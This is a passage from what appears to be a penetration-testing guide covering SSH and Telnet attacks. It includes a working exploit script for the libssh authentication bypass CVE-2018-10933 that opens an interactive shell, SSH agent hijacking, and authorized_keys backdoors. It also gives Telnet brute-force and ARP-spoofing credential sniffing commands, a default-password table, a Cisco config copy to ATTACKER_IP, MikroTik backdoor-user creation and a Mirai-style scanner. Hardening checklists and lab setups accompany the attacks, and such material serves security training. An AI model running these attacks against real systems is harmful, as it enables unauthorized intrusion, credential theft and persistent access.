  :::accordion-item{icon="i-lucide-layers" label="sshuttle — VPN over SSH"}
  `sshuttle` creates a **transparent VPN** over SSH — no SOCKS configuration needed.

  ```bash [Terminal]
  # Route entire subnet through SSH
  sshuttle -r user@$IP 10.10.10.0/24
  
  # Route all traffic
  sshuttle -r user@$IP 0.0.0.0/0
  
  # With SSH key
  sshuttle -r user@$IP --ssh-cmd "ssh -i id_rsa" 10.10.10.0/24
  
  # Exclude specific hosts
  sshuttle -r user@$IP 10.10.10.0/24 -x 10.10.10.25
  ```
  :::
::

### Authentication Bypass Vulnerabilities

::accordion
  :::accordion-item{icon="i-lucide-bug" label="libssh Authentication Bypass (CVE-2018-10933)"}
  libssh versions 0.6.0–0.8.3 allow authentication bypass by sending `SSH2_MSG_USERAUTH_SUCCESS` instead of `SSH2_MSG_USERAUTH_REQUEST`.

  ::steps{level="5"}

  ##### Detection

  ```bash [Banner Check]
  nc -nv $IP 22
  # Look for: SSH-2.0-libssh_0.8.1
  # Vulnerable: libssh 0.6.0 to 0.8.3
  ```

  ##### Exploitation — Python Script

  ```python [libssh_bypass.py]
  #!/usr/bin/env python3
  import paramiko
  import socket
  import sys
  
  target = sys.argv[1]
  port = int(sys.argv[2]) if len(sys.argv) > 2 else 22
  
  sock = socket.socket()
  sock.connect((target, port))
  
  # Create transport
  transport = paramiko.Transport(sock)
  transport.connect()
  
  # Send MSG_USERAUTH_SUCCESS (bypass authentication)
  message = paramiko.Message()
  message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
  transport._send_message(message)
  
  # Open session
  channel = transport.open_session()
  channel.exec_command('id')
  response = channel.recv(2048).decode()
  print(f"[+] Command output: {response}")
  
  # Interactive shell
  channel = transport.open_session()
  channel.get_pty()
  channel.invoke_shell()
  
  import select
  while True:
      r, w, e = select.select([channel, sys.stdin], [], [])
      if channel in r:
          data = channel.recv(1024).decode()
          if not data:
              break
          sys.stdout.write(data)
          sys.stdout.flush()
      if sys.stdin in r:
          cmd = input()
          channel.send(cmd + '\n')
  ```

  ##### Exploitation — Metasploit

  ```bash [Metasploit]
  use exploit/multi/ssh/libssh_auth_bypass
  set RHOSTS $IP
  set SPAWN_PTY true
  exploit
  ```

  ::

  ::caution
  This CVE affects **libssh** (the library), NOT **OpenSSH**. Most systems run OpenSSH and are **not vulnerable** to this. Check the banner carefully.
  ::
  :::

  :::accordion-item{icon="i-lucide-bug" label="OpenSSH 2.3-7.7 Username Enumeration (CVE-2018-15473)"}
  Already covered in the Enumeration section above. The server takes **measurably longer** to respond for valid usernames compared to invalid ones.
  :::

  :::accordion-item{icon="i-lucide-bug" label="OpenSSH <= 6.6 — Known Weak Key Generation"}
  ```bash [Terminal]
  # Debian weak key vulnerability (CVE-2008-0166)
  # Only 32,767 possible keys were generated
  
  # Download known weak keys
  git clone https://github.com/g0tmi1k/debian-ssh.git
  
  # Test if target uses a weak key
  python3 debian-ssh/common_keys/detect.py $IP
  ```
  :::
::

### SSH Configuration Exploitation

::accordion
  :::accordion-item{icon="i-lucide-settings" label="Exploiting Weak sshd_config"}
  If you gain read access to `/etc/ssh/sshd_config`:

  ```bash [Key Settings to Check]
  # Root login allowed?
  PermitRootLogin yes              # ← Can brute force root directly!
  
  # Password auth enabled?
  PasswordAuthentication yes       # ← Brute force possible
  
  # Empty passwords allowed?
  PermitEmptyPasswords yes         # ← Try blank passwords!
  
  # Specific users allowed?
  AllowUsers admin deploy backup   # ← These are valid usernames!
  AllowGroups sshusers developers  # ← These groups have SSH access
  
  # Agent forwarding enabled?
  AllowAgentForwarding yes         # ← SSH agent hijacking possible
  
  # TCP forwarding enabled?
  AllowTcpForwarding yes           # ← Tunneling/pivoting possible
  
  # X11 forwarding enabled?
  X11Forwarding yes                # ← X11 session hijacking possible
  
  # Authorized keys file location?
  AuthorizedKeysFile .ssh/authorized_keys  # ← Plant keys here
  ```
  :::

  :::accordion-item{icon="i-lucide-file-search" label="Exploiting ~/.ssh/config"}
  User SSH config files reveal internal infrastructure:

  ```bash [~/.ssh/config — Example]
  Host jumpbox
    HostName 10.10.10.25
    User admin
    IdentityFile ~/.ssh/jump_key
  
  Host database-prod
    HostName 10.10.20.50
    User dbadmin
    ProxyJump jumpbox
    
  Host webserver-internal
    HostName 10.10.20.100
    User www-data
    Port 2222
    ProxyJump jumpbox
  ```

  **Information extracted:**
  - Internal IP addresses
  - Valid usernames
  - Key file locations
  - Jump host architecture
  - Non-standard ports
  :::

  :::accordion-item{icon="i-lucide-monitor" label="SSH Agent Hijacking"}
  If SSH agent forwarding is enabled and you gain access to a server:

  ```bash [Terminal]
  # Check for forwarded SSH agent sockets
  ls -la /tmp/ssh-*/
  # or
  find /tmp -name "agent.*" 2>/dev/null
  
  # Hijack the agent
  export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.12345
  
  # List available keys in the agent
  ssh-add -l
  
  # Use the hijacked agent to connect to other hosts
  ssh user@internal-server
  # Authenticates using the ORIGINAL user's key!
  ```

  ::caution
  SSH agent hijacking requires **root access** on the intermediate server. It allows impersonating the user who forwarded their agent.
  ::
  :::
::

---

## Post-Exploitation

::card-group
  ::card
  ---
  title: ~/.ssh/known_hosts
  icon: i-lucide-list
  ---
  Parse `known_hosts` to discover **previously connected servers** — reveals internal infrastructure and lateral movement targets.
  ::

  ::card
  ---
  title: ~/.bash_history
  icon: i-lucide-history
  ---
  Check bash history for **SSH commands with passwords**, `scp` transfers, `mysql` connections with inline passwords, and other sensitive operations.
  ::

  ::card
  ---
  title: SSH Key Persistence
  icon: i-lucide-key
  ---
  Add your public key to `~/.ssh/authorized_keys` for **persistent backdoor access** that survives password changes.
  ::

  ::card
  ---
  title: Credential Harvesting
  icon: i-lucide-lock
  ---
  Check for stored credentials in `~/.ssh/config`, environment variables, cron jobs, and application config files accessible from the SSH session.
  ::
::

---

## Lab Environments

### Docker Compose — SSH Lab

::code-collapse

```yaml [docker-compose.yml]
version: '3.8'

services:
  # ================================
  # OpenSSH — Weak Credentials
  # ================================
  ssh-weak:
    image: rastasheep/ubuntu-sshd:18.04
    container_name: ssh-weak-lab
    ports:
      - "22:22"
    restart: unless-stopped
    networks:
      pentest-lab:
        ipv4_address: 172.22.0.10

  # ================================
  # OpenSSH — Key-based Auth Only
  # ================================
  ssh-keyauth:
    build:
      context: .
      dockerfile: Dockerfile.ssh-key
    container_name: ssh-keyauth-lab
    ports:
      - "2222:22"
    restart: unless-stopped
    networks:
      pentest-lab:
        ipv4_address: 172.22.0.11

  # ================================
  # Dropbear SSH — Lightweight (IoT)
  # ================================
  ssh-dropbear:
    image: mkodockx/docker-dropbear
    container_name: ssh-dropbear-lab
    ports:
      - "2223:22"
    restart: unless-stopped
    networks:
      pentest-lab:
        ipv4_address: 172.22.0.12

  # ================================
  # Internal Target (only reachable via pivot)
  # ================================
  internal-web:
    image: nginx:alpine
    container_name: ssh-internal-web
    networks:
      pentest-lab:
        ipv4_address: 172.22.0.50
    # No port mapping — only reachable through SSH tunnel

  internal-db:
    image: mysql:5.7
    container_name: ssh-internal-db
    environment:
      - MYSQL_ROOT_PASSWORD=secretpass
      - MYSQL_DATABASE=internal
    networks:
      pentest-lab:
        ipv4_address: 172.22.0.51
    # No port mapping — only reachable through SSH tunnel

networks:
  pentest-lab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.22.0.0/24
```

::

---

## Defensive Checks

::accordion
  :::accordion-item{icon="i-lucide-shield-check" label="SSH Hardening Checklist"}
  | Finding | Remediation | Priority |
  |---------|-------------|----------|
  | Password auth enabled | Use key-based auth only: `PasswordAuthentication no` | 🔴 Critical |
  | Root login allowed | `PermitRootLogin no` (or `prohibit-password`) | 🔴 Critical |
  | Outdated SSH version | Update OpenSSH to latest version | 🔴 Critical |
  | Weak ciphers/algorithms | Configure strong ciphers in `sshd_config` | 🟠 High |
  | Agent forwarding enabled | `AllowAgentForwarding no` unless required | 🟠 High |
  | No rate limiting | Install `fail2ban` or configure `MaxAuthTries` | 🟠 High |
  | Empty passwords allowed | `PermitEmptyPasswords no` | 🔴 Critical |
  | Protocol 1 supported | `Protocol 2` (SSH-1 is broken) | 🔴 Critical |
  | No user restrictions | Use `AllowUsers` or `AllowGroups` | 🟡 Medium |
  | Default port | Change to non-standard port (security through obscurity) | 🟢 Low |
  | X11 forwarding enabled | `X11Forwarding no` unless required | 🟡 Medium |
  :::
::

---

## Tools Summary

::collapsible

| Tool | Purpose | Install | Key Usage |
|------|---------|---------|-----------|
| **ssh** | SSH client | Pre-installed | `ssh -i key user@$IP` |
| **ssh-audit** | SSH security audit | `pip3 install ssh-audit` | `ssh-audit $IP` |
| **ssh2john** | Key hash extraction | Built into John | `ssh2john id_rsa > hash` |
| **Hydra** | Brute force | `apt install hydra` | `hydra -l root -P pass.txt ssh://$IP` |
| **Patator** | Brute force | `apt install patator` | `patator ssh_login host=$IP ...` |
| **CrackMapExec** | Credential testing | `apt install crackmapexec` | `cme ssh $IP -u user -p pass` |
| **Metasploit** | Enum & exploitation | Built into Kali | `use auxiliary/scanner/ssh/ssh_login` |
| **sshuttle** | VPN over SSH | `apt install sshuttle` | `sshuttle -r user@$IP 10.0.0.0/24` |
| **proxychains** | SOCKS proxy routing | `apt install proxychains4` | `proxychains nmap ...` |
| **ssh-keygen** | Key generation | Pre-installed | `ssh-keygen -t ed25519` |

::

---

## References & Resources

::card-group
  ::card
  ---
  title: HackTricks — SSH Pentesting
  icon: i-lucide-external-link
  to: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html
  target: _blank
  ---
  Complete SSH pentesting guide — enumeration, brute force, tunneling, exploitation.
  ::

  ::card
  ---
  title: ssh-audit
  icon: i-lucide-terminal
  to: https://github.com/jtesta/ssh-audit
  target: _blank
  ---
  Comprehensive SSH server and client auditing tool — algorithm analysis and CVE detection.
  ::

  ::card
  ---
  title: PayloadsAllTheThings — SSH
  icon: i-lucide-file-text
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md
  target: _blank
  ---
  SSH tunneling, pivoting, and port forwarding techniques.
  ::

  ::card
  ---
  title: CVE-2018-15473 Exploit
  icon: i-lucide-shield-alert
  to: https://github.com/epi052/cve-2018-15473
  target: _blank
  ---
  OpenSSH username enumeration exploit for versions < 7.7.
  ::

  ::card
  ---
  title: libssh CVE-2018-10933
  icon: i-lucide-shield-alert
  to: https://www.cvedetails.com/cve/CVE-2018-10933/
  target: _blank
  ---
  libssh authentication bypass — send success message without authenticating.
  ::

  ::card
  ---
  title: RFC 4253 — SSH Transport
  icon: i-lucide-book-open
  to: https://datatracker.ietf.org/doc/html/rfc4253
  target: _blank
  ---
  SSH protocol specification — understand the protocol at the deepest level.
  ::
::

---

## Attack Flow Diagram

::steps{level="4"}

#### Discovery & Banner

```bash [Terminal]
nmap -sV -sC -p 22 $IP
ssh-audit $IP
```
→ **Identify version** → Check for CVEs (libssh bypass, user enum)

#### Check Auth Methods

```bash [Terminal]
ssh -o PreferredAuthentications=none user@$IP 2>&1
```
→ **Password auth?** → Brute force / password spray
→ **Key auth only?** → Hunt for exposed private keys

#### Username Enumeration

```bash [Terminal]
# If OpenSSH < 7.7
python3 ssh_user_enum.py --userList users.txt $IP
```
→ **Valid users** → Targeted attacks

#### Credential Attack

```bash [Terminal]
hydra -l found_user -P targeted_wordlist.txt ssh://$IP -t 4
```
→ **Creds found?** → Login, escalate, pivot

#### Private Key Hunt

```bash [Terminal]
# Search FTP, SMB, web servers for id_rsa files
```
→ **Key found + encrypted?** → `ssh2john` + crack passphrase
→ **Key found + unencrypted?** → Direct login

#### Post-Exploitation Pivoting

```bash [Terminal]
ssh -D 9050 user@$IP  # SOCKS proxy
ssh -L 8080:internal:80 user@$IP  # Port forward
sshuttle -r user@$IP 10.0.0.0/24  # VPN
```

::

---
---

## Port 23 — Telnet Pentesting Guide

::badge
Port 23/TCP
::
::badge
Telnet Protocol
::
::badge
Clear-text
::
::badge
Legacy/Insecure
::
::badge
IoT/Network Devices
::
::badge
Default Credentials
::

![Telnet Session](https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/Telnet-bsd.png/640px-Telnet-bsd.png)

> **Telnet** provides unencrypted remote terminal access. It is a **legacy protocol** that transmits everything — including credentials — in **clear text**. While largely replaced by SSH, Telnet remains prevalent on **IoT devices**, **network equipment** (routers, switches, firewalls), **printers**, **SCADA/ICS systems**, and **legacy enterprise hardware**.

::card-group
  ::card
  ---
  title: Clear-text Everything
  icon: i-lucide-eye
  ---
  Telnet transmits all data including **credentials in plaintext**. Any network capture exposes the complete session.
  ::

  ::card
  ---
  title: Default Credentials
  icon: i-lucide-key
  ---
  Telnet-enabled devices frequently use **factory default credentials** — especially IoT devices, routers, and embedded systems.
  ::

  ::card
  ---
  title: No Encryption
  icon: i-lucide-shield-off
  ---
  Unlike SSH, Telnet provides **zero encryption**. MITM attacks trivially capture all session data.
  ::

  ::card
  ---
  title: IoT/OT Prevalence
  icon: i-lucide-cpu
  ---
  Telnet is still the **primary management protocol** for many IoT, ICS/SCADA, and legacy network devices.
  ::
::

::caution
Telnet should **never** be used in production environments. Its presence alone is a **finding** in any security assessment. All Telnet traffic can be trivially intercepted.
::

---

## How Telnet Works

```
1. Client connects to Server port 23
2. Server sends banner (may include login prompt)
3. Client sends username in PLAINTEXT
4. Server prompts for password
5. Client sends password in PLAINTEXT
6. Interactive terminal session begins
7. ALL commands and output sent in PLAINTEXT
```

### Telnet vs SSH Comparison

| Feature | Telnet | SSH |
|---------|--------|-----|
| **Encryption** | ❌ None | ✅ Full encryption |
| **Authentication** | Plaintext | Encrypted + Key-based |
| **Data Integrity** | ❌ None | ✅ MAC verification |
| **Port** | 23 | 22 |
| **Security** | ❌ Completely insecure | ✅ Secure by design |
| **Use Case** | Legacy/IoT only | Universal remote access |

---

## Enumeration

### Nmap Discovery

::tabs
  :::tabs-item{icon="i-lucide-scan" label="Basic Scan"}
  ```bash [Terminal]
  nmap -sV -sC -p 23 $IP
  ```
  :::

  :::tabs-item{icon="i-lucide-zap" label="Telnet Scripts"}
  ```bash [Terminal]
  nmap -p 23 --script=telnet-encryption,telnet-ntlm-info,telnet-brute $IP
  ```
  :::

  :::tabs-item{icon="i-lucide-network" label="Non-standard Ports"}
  ```bash [Terminal]
  # Telnet sometimes runs on other ports
  nmap -sV -p 23,2323,9999,8023 $IP
  ```
  :::
::

### Banner Grabbing

::code-group
```bash [Netcat]
nc -nv $IP 23
```

```bash [Telnet]
telnet $IP 23
```

```bash [Nmap]
nmap -p 23 --script=banner $IP
```

```bash [Ncat (with timeout)]
ncat -w 5 $IP 23
```
::

::tip
Telnet banners reveal device type and often provide crucial identification:
```text
User Access Verification               ← Cisco IOS
MikroTik v6.48.6                       ← MikroTik RouterOS
BusyBox v1.30.1                        ← Embedded Linux/IoT
DD-WRT v3.0                            ← DD-WRT Router
HP JetDirect                           ← HP Printer
AXIS 210A Network Camera               ← IP Camera
Welcome to Microsoft Telnet Server.    ← Windows Telnet
Ubuntu 20.04.3 LTS                     ← Linux
login:                                 ← Generic Unix/Linux
```
::

### NTLM Information Disclosure

If the Telnet server supports NTLM authentication (Windows):

```bash [Terminal]
nmap -p 23 --script telnet-ntlm-info $IP
```

Reveals:
- NetBIOS domain name
- Computer name
- DNS domain name
- OS version

---

## Pentesting Methods

### Default Credentials

::accordion
  :::accordion-item{icon="i-lucide-key" label="Device-Specific Default Credentials"}
  The **#1 attack** against Telnet is testing default credentials. Most devices never have their defaults changed.

  | Device Type | Manufacturer | Username | Password |
  |-------------|-------------|----------|----------|
  | **Router** | Cisco IOS | `cisco` | `cisco` |
  | **Router** | Cisco IOS | `admin` | `admin` |
  | **Router** | Cisco Enable | `enable` | *(blank)* |
  | **Router** | MikroTik | `admin` | *(blank)* |
  | **Router** | Juniper | `root` | `Juniper` |
  | **Router** | Huawei | `admin` | `Admin@123` |
  | **Router** | TP-Link | `admin` | `admin` |
  | **Router** | D-Link | `admin` | `admin` |
  | **Router** | Netgear | `admin` | `password` |
  | **Router** | Linksys | `admin` | `admin` |
  | **Switch** | Cisco | `cisco` | `cisco` |
  | **Switch** | HP ProCurve | `admin` | *(blank)* |
  | **Firewall** | Fortinet | `admin` | *(blank)* |
  | **Firewall** | Palo Alto | `admin` | `admin` |
  | **Firewall** | SonicWall | `admin` | `password` |
  | **Printer** | HP JetDirect | *(none)* | *(none)* |
  | **Printer** | Xerox | `admin` | `1111` |
  | **Printer** | Samsung | `admin` | `sec00000` |
  | **IP Camera** | Hikvision | `admin` | `12345` |
  | **IP Camera** | Dahua | `admin` | `admin` |
  | **IP Camera** | Axis | `root` | `pass` |
  | **IoT** | BusyBox | `root` | `root` |
  | **IoT** | BusyBox | `admin` | `admin` |
  | **IoT** | Generic | `root` | *(blank)* |
  | **IoT** | Generic | `admin` | `1234` |
  | **NAS** | Synology | `admin` | `admin` |
  | **NAS** | QNAP | `admin` | `admin` |
  | **Server** | Windows | `Administrator` | *(varies)* |
  | **Server** | Linux | `root` | `root` |
  | **Server** | Linux | `root` | `toor` |
  | **Database** | Oracle | `system` | `manager` |
  | **KVM/iLO** | HP iLO | `Administrator` | *(varies)* |
  | **KVM/iLO** | Dell iDRAC | `root` | `calvin` |
  | **KVM/iLO** | Supermicro | `ADMIN` | `ADMIN` |

  ::tip
  Use [cirt.net/passwords](https://cirt.net/passwords) and [default-password.info](https://default-password.info/) for comprehensive default credential databases.
  ::
  :::

  :::accordion-item{icon="i-lucide-terminal" label="Manual Login Testing"}
  ```bash [Terminal]
  telnet $IP
  # Login: admin
  # Password: admin
  
  # Cisco IOS
  telnet $IP
  # Password: cisco
  > enable
  # Password: cisco
  # Now in privileged mode
  
  # MikroTik
  telnet $IP
  # Login: admin
  # Password: (press Enter)
  
  # IoT/BusyBox
  telnet $IP
  # Login: root
  # Password: root
  ```
  :::
::

### Brute Force Attacks

::accordion
  :::accordion-item{icon="i-lucide-lock-open" label="Telnet Brute Force"}
  ::code-group
  ```bash [Hydra]
  # Basic brute force
  hydra -L users.txt -P passwords.txt telnet://$IP -t 16 -V
  
  # Single user
  hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://$IP -t 16
  
  # Custom port
  hydra -L users.txt -P passwords.txt telnet://$IP -s 2323 -t 16
  ```

  ```bash [Medusa]
  medusa -h $IP -U users.txt -P passwords.txt -M telnet -t 16
  ```

  ```bash [Nmap]
  nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=pass.txt $IP
  ```

  ```bash [Patator]
  patator telnet_login host=$IP inputs='FILE0\nFILE1' 0=users.txt 1=passwords.txt persistent=0 prompt_re='Username:|Password:' -x ignore:egrep='Login incorrect|Access denied'
  ```

  ```bash [Metasploit]
  use auxiliary/scanner/telnet/telnet_login
  set RHOSTS $IP
  set USER_FILE users.txt
  set PASS_FILE passwords.txt
  set THREADS 16
  run
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-cpu" label="IoT-Specific Credential Lists"}
  ```bash [Terminal]
  # Use IoT-specific wordlists
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://$IP -t 16
  
  # Mirai botnet default list
  hydra -C /usr/share/seclists/Passwords/Malware/mirai-botnet.txt telnet://$IP -t 16
  ```

  ::note
  The Mirai botnet exploited **default Telnet credentials** on IoT devices to build one of the largest botnets in history. The credential list it used is publicly available in SecLists.
  ::
  :::
::

### Credential Sniffing

::accordion
  :::accordion-item{icon="i-lucide-wifi" label="Telnet Traffic Capture"}
  Telnet sends **everything in plaintext** — credentials, commands, and all output.

  ```bash [tcpdump — Live Capture]
  # Capture all Telnet traffic
  tcpdump -i eth0 -A port 23 -w telnet_capture.pcap
  
  # Live display of Telnet data
  tcpdump -i eth0 -A port 23 2>/dev/null | grep -v "^$"
  ```

  ```bash [Wireshark Filters]
  # Filter Telnet traffic
  telnet
  tcp.port == 23
  
  # View specific data
  telnet.data
  
  # Follow TCP stream for full session
  # Right-click any Telnet packet → Follow → TCP Stream
  # Credentials will be visible in the stream
  ```

  ```bash [tshark — Command Line]
  tshark -i eth0 -f "port 23" -T fields -e telnet.data
  ```

  ```bash [dsniff — Automated Credential Sniffing]
  dsniff -i eth0
  # Automatically detects and displays Telnet credentials
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="ARP Spoofing + Telnet Capture"}
  Position yourself as MITM to capture Telnet credentials on the network:

  ```bash [Ettercap]
  ettercap -T -q -i eth0 -M arp:remote /$GATEWAY// /$VICTIM_IP//
  # Telnet credentials displayed automatically
  ```

  ```bash [arpspoof + tcpdump]
  # Terminal 1: Enable IP forwarding
  echo 1 > /proc/sys/net/ipv4/ip_forward
  
  # Terminal 2: ARP spoof
  arpspoof -i eth0 -t $VICTIM_IP $GATEWAY_IP
  
  # Terminal 3: Capture Telnet creds
  tcpdump -i eth0 -A port 23 | grep -E "login|password|Login|Password"
  ```

  ```bash [Bettercap]
  bettercap -iface eth0
  > net.probe on
  > set arp.spoof.targets $VICTIM_IP
  > arp.spoof on
  > net.sniff on
  # Telnet credentials captured and displayed
  ```
  :::
::

### Network Device Exploitation

::accordion
  :::accordion-item{icon="i-lucide-router" label="Cisco IOS Exploitation via Telnet"}
  ```bash [Terminal — Cisco Login]
  telnet $IP
  Password: cisco
  
  Router> enable
  Password: cisco
  Router#
  ```

  ```bash [Post-Login Enumeration]
  Router# show version
  Router# show running-config
  Router# show interfaces
  Router# show ip route
  Router# show ip arp
  Router# show cdp neighbors detail
  Router# show users
  Router# show privilege
  
  # Extract password hashes
  Router# show running-config | include password
  Router# show running-config | include secret
  
  # Type 7 passwords can be decoded instantly
  # Use: https://www.ifm.net.nz/cookbooks/passwordcracker.html
  ```

  ```bash [Cisco Config Download]
  # If TFTP is available
  Router# copy running-config tftp://ATTACKER_IP/cisco_config.txt
  
  # Or copy to flash and download via other means
  Router# copy running-config flash:config_backup.txt
  ```
  :::

  :::accordion-item{icon="i-lucide-settings" label="MikroTik Exploitation via Telnet"}
  ```bash [Terminal]
  telnet $IP
  Login: admin
  Password: (blank)
  
  # Enumerate
  [admin@MikroTik] > /system identity print
  [admin@MikroTik] > /ip address print
  [admin@MikroTik] > /ip route print
  [admin@MikroTik] > /user print
  [admin@MikroTik] > /interface print
  [admin@MikroTik] > /ip firewall filter print
  
  # Create backdoor user
  [admin@MikroTik] > /user add name=backdoor password=backdoor123 group=full
  
  # Enable SSH for persistent access
  [admin@MikroTik] > /ip service enable ssh
  ```
  :::

  :::accordion-item{icon="i-lucide-printer" label="Printer Exploitation via Telnet"}
  ```bash [HP JetDirect]
  telnet $IP
  # Usually no authentication required!
  
  # Get printer info
  @PJL INFO ID
  @PJL INFO STATUS
  @PJL INFO FILESYS
  @PJL INFO VARIABLES
  
  # Read files from printer filesystem
  @PJL FSQUERY NAME="0:\"
  @PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=99
  
  # Access print jobs (may contain sensitive docs)
  @PJL FSUPLOAD NAME="0:\readyNET\default.xml"
  ```

  ```bash [PRET — Printer Exploitation Toolkit]
  # Install
  git clone https://github.com/RUB-NDS/PRET.git
  cd PRET
  pip install -r requirements.txt
  
  # Connect
  python3 pret.py $IP pjl
  
  # Commands
  pret> ls
  pret> get /etc/passwd
  pret> info
  pret> env
  ```

  ::tip
  Printers connected via Telnet often have access to **LDAP credentials** (for Active Directory integration), **email server credentials**, and can be used for **LDAP pass-back attacks**.
  ::
  :::
::

### IoT/Embedded Device Exploitation

::accordion
  :::accordion-item{icon="i-lucide-cpu" label="BusyBox Shell Exploitation"}
  Many IoT devices run BusyBox — a lightweight Unix environment:

  ```bash [Terminal]
  telnet $IP
  Login: root
  Password: root
  
  BusyBox v1.30.1 (2021-03-15 12:30:00 UTC) built-in shell (ash)
  
  # Enumerate
  id
  uname -a
  cat /etc/passwd
  cat /etc/shadow
  ifconfig
  ps aux
  mount
  cat /proc/cpuinfo
  
  # Check for other network interfaces
  ip addr show
  arp -a
  
  # Look for credentials in config files
  find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null
  grep -r "password" /etc/ 2>/dev/null
  grep -r "passwd" /var/ 2>/dev/null
  
  # Check for writable firmware
  ls -la /dev/mtd*
  cat /proc/mtd
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-alert" label="Mirai-Style IoT Scanning"}
  ```bash [Custom IoT Scanner]
  #!/bin/bash
  # Scan for Telnet-enabled IoT devices with default creds
  
  SUBNET="192.168.1"
  CREDS=(
    "root:root"
    "admin:admin"
    "root:"
    "admin:1234"
    "admin:password"
    "root:vizxv"
    "root:admin"
    "root:xc3511"
    "root:888888"
    "root:default"
  )
  
  for host in $(seq 1 254); do
    IP="${SUBNET}.${host}"
    if timeout 1 bash -c "echo > /dev/tcp/$IP/23" 2>/dev/null; then
      echo "[+] Telnet open: $IP"
      for cred in "${CREDS[@]}"; do
        USER="${cred%%:*}"
        PASS="${cred##*:}"
        echo "[*] Trying $USER:$PASS on $IP"
      done
    fi
  done
  ```

  ::caution
  This technique was used by the **Mirai botnet** to compromise millions of IoT devices. Use only in authorized engagements and never on the public internet.
  ::
  :::
::

### Telnet as a Service Interaction Tool

::accordion
  :::accordion-item{icon="i-lucide-terminal" label="Using Telnet to Test Other Services"}
  Telnet is useful as a raw TCP client to interact with **any text-based protocol**:

  ```bash [HTTP]
  telnet $IP 80
  GET / HTTP/1.1
  Host: $IP
  
  ```

  ```bash [SMTP]
  telnet $IP 25
  EHLO test
  VRFY admin
  ```

  ```bash [POP3]
  telnet $IP 110
  USER admin
  PASS password
  LIST
  RETR 1
  ```

  ```bash [IMAP]
  telnet $IP 143
  a LOGIN admin password
  a LIST "" "*"
  a SELECT INBOX
  ```

  ```bash [FTP]
  telnet $IP 21
  USER anonymous
  PASS anonymous
  LIST
  ```

  ```bash [MySQL]
  telnet $IP 3306
  # Binary protocol, but banner may be visible
  ```
  :::
::

---

## Lab Environments

### Docker Compose — Telnet Lab

::code-collapse

```yaml [docker-compose.yml]
version: '3.8'

services:
  # ================================
  # Telnet Server — Default Credentials
  # ================================
  telnet-default:
    image: wastrachan/telnetd
    container_name: telnet-default-lab
    ports:
      - "23:23"
    environment:
      - USER=admin
      - PASS=admin123
    restart: unless-stopped
    networks:
      pentest-lab:
        ipv4_address: 172.23.0.10

  # ================================
  # Telnet Server — Multiple Users
  # ================================
  telnet-multi:
    build:
      context: .
      dockerfile: Dockerfile.telnet
    container_name: telnet-multi-lab
    ports:
      - "2323:23"
    restart: unless-stopped
    networks:
      pentest-lab:
        ipv4_address: 172.23.0.11

  # ================================
  # BusyBox — IoT Simulation
  # ================================
  busybox-iot:
    image: busybox
    container_name: telnet-iot-lab
    command: sh -c "while true; do echo 'IoT Device Ready'; sleep 3600; done"
    restart: unless-stopped
    networks:
      pentest-lab:
        ipv4_address: 172.23.0.12

networks:
  pentest-lab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.23.0.0/24
```

::

---

## Defensive Checks

::accordion
  :::accordion-item{icon="i-lucide-shield-check" label="Telnet Hardening Checklist"}
  | Finding | Remediation | Priority |
  |---------|-------------|----------|
  | Telnet enabled | **Disable Telnet entirely** — replace with SSH | 🔴 Critical |
  | Default credentials | Change ALL default passwords immediately | 🔴 Critical |
  | No encryption | Migrate to SSH or enable TLS wrapper | 🔴 Critical |
  | Telnet on network devices | Enable SSH, disable Telnet: `no service telnet` (Cisco) | 🔴 Critical |
  | IoT devices with Telnet | Update firmware, disable Telnet if possible | 🔴 Critical |
  | No access control | Restrict Telnet access via ACLs/firewall | 🟠 High |
  | No logging | Enable logging for all Telnet sessions | 🟡 Medium |
  | No banner warning | Add legal warning banner | 🟢 Low |
  :::
::

---

## Tools Summary

::collapsible

| Tool | Purpose | Install | Key Usage |
|------|---------|---------|-----------|
| **telnet** | Telnet client | Pre-installed | `telnet $IP 23` |
| **netcat** | Raw TCP connection | Pre-installed | `nc -nv $IP 23` |
| **Hydra** | Brute force | `apt install hydra` | `hydra -l admin -P pass.txt telnet://$IP` |
| **Medusa** | Brute force | `apt install medusa` | `medusa -h $IP -M telnet` |
| **Nmap NSE** | Scanning & brute | Built into Nmap | `nmap --script telnet-brute $IP` |
| **Metasploit** | Login scanner | Built into Kali | `use auxiliary/scanner/telnet/telnet_login` |
| **Wireshark** | Credential sniffing | `apt install wireshark` | Filter: `telnet` |
| **tcpdump** | Packet capture | Pre-installed | `tcpdump -A port 23` |
| **dsniff** | Auto cred capture | `apt install dsniff` | `dsniff -i eth0` |
| **PRET** | Printer exploitation | `git clone` | `python3 pret.py $IP pjl` |
| **Bettercap** | MITM + sniffing | `apt install bettercap` | `bettercap -iface eth0` |

::

---

## References & Resources

::card-group
  ::card
  ---
  title: HackTricks — Telnet Pentesting
  icon: i-lucide-external-link
  to: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-telnet.html
  target: _blank
  ---
  Telnet enumeration, brute force, and exploitation techniques.
  ::

  ::card
  ---
  title: Default Passwords Database
  icon: i-lucide-database
  to: https://cirt.net/passwords
  target: _blank
  ---
  Comprehensive database of default credentials for thousands of devices.
  ::

  ::card
  ---
  title: Mirai Botnet Credential List
  icon: i-lucide-shield-alert
  to: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Malware/mirai-botnet.txt
  target: _blank
  ---
  The default credential list used by the Mirai botnet to compromise IoT devices.
  ::

  ::card
  ---
  title: PRET — Printer Exploitation
  icon: i-lucide-terminal
  to: https://github.com/RUB-NDS/PRET
  target: _blank
  ---
  Printer Exploitation Toolkit — PJL, PostScript, and PCL exploitation via Telnet.
  ::

  ::card
  ---
  title: Cisco Password Recovery
  icon: i-lucide-key
